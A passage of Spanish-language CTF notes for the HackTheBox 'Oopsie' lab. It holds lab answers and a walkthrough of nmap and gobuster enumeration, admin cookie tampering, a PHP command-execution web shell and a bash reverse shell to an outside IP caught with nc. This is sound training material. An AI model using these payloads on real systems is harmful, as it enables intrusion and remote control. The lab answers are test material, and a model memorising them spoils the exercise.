1)¿Con qué tipo de herramienta se puede interceptar el tráfico web?
	proxy

2)¿Cuál es la ruta al directorio en el servidor web que devuelve una página de inicio de sesión?
	/cdn-cgi/login
	Esto se respondio con el sitemap de caido y enumeracion de directorios con [[Gobuster]]

3)¿Qué se puede modificar en Firefox para acceder a la página de carga?
	cookie
	Esto por que en la pagina de uploads dice que tenemos que ser administrador, y eso se define en nuestro navegador por las cookies

4)¿Cuál es el ID de acceso del usuario admin?
	34322
	Esta respondido antes del cookie hijacking

5)Al cargar un archivo, ¿en qué directorio aparece ese archivo en el servidor?
	/uploads
	![[Oopsie11.png]]

6)¿Cuál es el archivo que contiene la contraseña que se comparte con el usuario robert?
	










-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.207.226
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.207.226 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.207.226 -oN target
```

![[Oopsie1.png]]

![[Oopsie2.png]]
Por el ttl cercano a 64 es una maquina linux
*Puertos*
`22` SSH
`80`HTTP apache


----
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

![[Oopsie3.png]]

No nos da ningun dato relevante

------
# Vamos a interceptar con [[Caido]]

Aceptamos la primera peticion de la pagina, para que pase todo el trafico asi se genera un sitemap

![[Oopsie5.png]]
Ahora tenemos una carpeta que se llama cdn-cgi
Con [[Gobuster]] `gobuster dir -u http://10.129.207.226/cdn-cgi/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 50` vamos a buscar posibles directorios y nos da que existe el directorio login

![[Oopsie4.png]]

--------
# Ingreso al panel de login

http://10.129.207.226/cdn-cgi/login/

![[Oopsie6.png]]
Entramos con ``login as a guest``

Ahora vamos a account
![[Oopsie7.png]]

Y vemos que somos el usuario id 2, normalmente el usuario admin es el id 1 por que es el primero en crearse
![[Oopsie8.png]]

Cambiamos el link a `http://10.129.207.226/cdn-cgi/login/admin.php?content=accounts&id=1`

![[Oopsie9.png]]
Y vemos el id del usuario admin, ahora vamos a cambiar los valores de la cookie para robarnos las credenciales

------
# Cookie Hijacking

Con el user id 34322 y el name de admin, que sacamos antes, vamos a apretar en el navegador CTRL + SHIFT + I
Se nos va a abrir esto y vamos a cambiar el valor role `guest` a `admin` y el valor de user `2233` a `34322`

![[Oopsie10.png]]
Reiniciamos y la pagina, y ya estamos como el usuario admin

---------
# Arbitrary file upload

![[Oopsie12.png]]

Desde la parte de uploads, vamos a cargar un [[archivo php inyección comandos]]

`test.php`
```
<?php system($_GET["cmd"]); ?>
```
Lo subimos con este contenido, en uno de nuestros primeros intentos de enumerar, habiamos visto que existe el directorio uploads
![[Oopsie11.png]]

Entonces desde el directorio uploads vamos a intentar inyectar comandos con la utilidad que subimos
http://10.129.207.226/uploads/test.php?cmd=whoami
![[Oopsie13.png]]
Nos responde www-data asi que funciona correctamente

------
# [[Reverse shell]]

Con el archivo que subimos antes, vamos a ejecutar la revershell
http://10.129.207.226/uploads/test.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261'

![[Oopsie14.png]]
Mientras estamos en escucha con [[nc -nlvp 443]]

![[Oopsie15.png]]
Ya estamos dentro de la maquina, ahora hacemos un [[Tratamiento de la TTY]]




-------
# Notas

Para el sitemap si usamos caido, no nos va a detectar el directorio login, pero con burpsuite

------
# Creditos
Writeup oficial HackTheBox